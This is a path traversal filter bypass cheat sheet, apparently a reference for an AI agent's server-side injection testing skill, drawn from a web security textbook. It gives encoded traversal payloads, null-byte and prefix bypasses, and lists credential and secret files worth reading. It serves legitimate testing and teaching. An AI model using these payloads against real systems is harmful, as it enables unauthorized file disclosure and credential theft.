# Path Traversal Filter Bypass Matrix

Reference for Step 4c of the server-side-injection-testing skill. Work through these in order. When initial traversal sequences are blocked, apply each bypass technique systematically. Combine traversal bypasses with file-type suffix bypasses when both types of filters are present.

## Baseline Sequences (Try First)

Always try both forward slash and backslash variants — many filters check only one:

```
../../../etc/passwd          (Unix forward slash)
..\..\..\windows\win.ini     (Windows backslash)
```

Use many repetitions — redundant sequences that exceed the filesystem root are silently ignored:

```
../../../../../../../../../../../../etc/passwd
```

---

## Bypass Techniques

### 1. URL Encoding

Encode every dot and slash in the traversal sequence:

| Character | Encoding |
|-----------|----------|
| `.` (dot) | `%2e` |
| `/` (forward slash) | `%2f` |
| `\` (backslash) | `%5c` |

Example: `%2e%2e%2f%2e%2e%2fetc%2fpasswd`

### 2. Double URL Encoding

Apply URL encoding a second time (encode the `%` sign):

| Character | Double Encoding |
|-----------|----------------|
| `.` (dot) | `%252e` |
| `/` (forward slash) | `%252f` |
| `\` (backslash) | `%255c` |

Example: `%252e%252e%252f%252e%252e%252fetc%252fpasswd`

### 3. 16-bit Unicode Encoding

| Character | Unicode Encoding |
|-----------|-----------------|
| `.` (dot) | `%u002e` |
| `/` (forward slash) | `%u2215` |
| `\` (backslash) | `%u2216` |

Example: `%u002e%u002e%u2215etc%u2215passwd`

Note: Illegal Unicode payload types (non-standard representations) are accepted by many Windows Unicode decoders. Use Burp Intruder's illegal Unicode payload type to generate large numbers of alternate representations.

### 4. Overlong UTF-8 Encoding

Multi-byte UTF-8 sequences that encode single-byte ASCII characters. Violate Unicode specification but accepted by many decoders, especially on Windows:

| Character | Overlong Encodings |
|-----------|-------------------|
| `.` (dot) | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/` (forward slash) | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\` (backslash) | `%c0%5c`, `%c0%80%5c` |

Example: `%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd`

### 5. Non-Recursive Stripping Bypass

When the application strips `../` but does not repeat the stripping until no more sequences remain, embedding one sequence inside another defeats the filter:

```
....//          (strips ../ from middle, leaves ../)
....\/
..././
....\/ 
....\\
```

Example: `....//....//....//etc/passwd` → after stripping inner `../`: `../../../etc/passwd`

### 6. Null Byte Injection (File Type Suffix Bypass)

When the application checks that the filename ends with an expected extension (e.g., `.jpg`), place a URL-encoded null byte before the suffix:

```
../../../../etc/passwd%00.jpg
../../../../boot.ini%00.jpg
```

**Why it works:** The file type check is performed in a managed environment where strings may contain null bytes (e.g., Java's `String.endsWith()` is null-byte tolerant). The actual file open call uses a C-based unmanaged API that is null-terminated — the string is truncated at `%00`, and the null byte and everything after it are ignored.

### 7. Required Prefix Bypass

When the application checks that the filename *starts with* an expected directory or prefix:

```
filestore/../../../../../etc/passwd
images/../../../../../etc/passwd
```

The check passes because the input starts with the expected prefix. The filesystem canonicalizes the path, canceling the prefix with the traversal sequences.

---

## Combination Strategy

When individual techniques fail, combine traversal bypasses with suffix bypasses:

```
%252e%252e%252f%252e%252e%252fetc%252fpasswd%2500.jpg
....//....//....//etc/passwd%00.jpg
```

Work in stages in whitebox access scenarios:
1. Establish which traversal encoding reaches the filesystem (by monitoring filesystem calls)
2. Establish which suffix filter applies
3. Combine both bypasses

---

## Target Files by Platform

**Unix/Linux:**
- `/etc/passwd` — user account list (world-readable)
- `/etc/shadow` — password hashes (root only — confirms high privilege if readable)
- `/proc/self/environ` — process environment variables (may contain credentials)
- `/var/log/apache2/access.log` — access logs (may enable log poisoning for code execution)
- Application config: `/var/www/html/config.php`, `.env` files

**Windows:**
- `C:\windows\win.ini` — always readable, confirms traversal
- `C:\windows\system32\config\sam` — SAM database (locked by OS when running; unreadable confirms restriction)
- `C:\inetpub\wwwroot\web.config` — IIS configuration, may contain connection strings
- `C:\windows\repair\sam` — backup SAM database (may be readable)

Source: Stuttard, D. & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.), Chapter 10, pp. 374-378. Wiley.
